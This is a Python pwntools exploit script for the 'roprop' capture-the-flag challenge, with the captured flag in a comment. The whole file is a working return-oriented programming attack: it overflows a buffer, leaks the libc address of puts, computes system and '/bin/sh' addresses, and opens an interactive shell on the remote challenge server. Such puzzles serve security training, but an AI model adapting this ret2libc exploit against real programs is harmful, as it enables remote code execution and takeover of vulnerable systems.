#exploit for roprop
#darkCTF{y0u_r0p_r0p_4nd_w0n}
from pwn import *
import time
elf = ELF("./roprop")
context.binary=elf
libc=elf.libc
#target=process([elf.path])
target=remote('roprop.darkarmy.xyz',5002)
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

main=0x4008b2
poprdi=0x0000000000400963
ret=0x0000000000400646
payload="A"*0x58+p64(poprdi)+p64(elf.got["puts"])+p64(elf.plt["puts"])+p64(main)
sla("19's.\n\n",payload)
libc_puts=u64(target.recv(6).ljust(8,"\x00"))
libc_base=libc_puts-libc.symbols["puts"]
libc_system=libc_base+libc.symbols["system"]
libc_binsh=libc_base+libc.search("/bin/sh\x00").next()
payload="A"*0x58+p64(poprdi)+p64(libc_binsh)+p64(ret)+p64(libc_system)
sla("19's.\n\n",payload)
target.interactive()
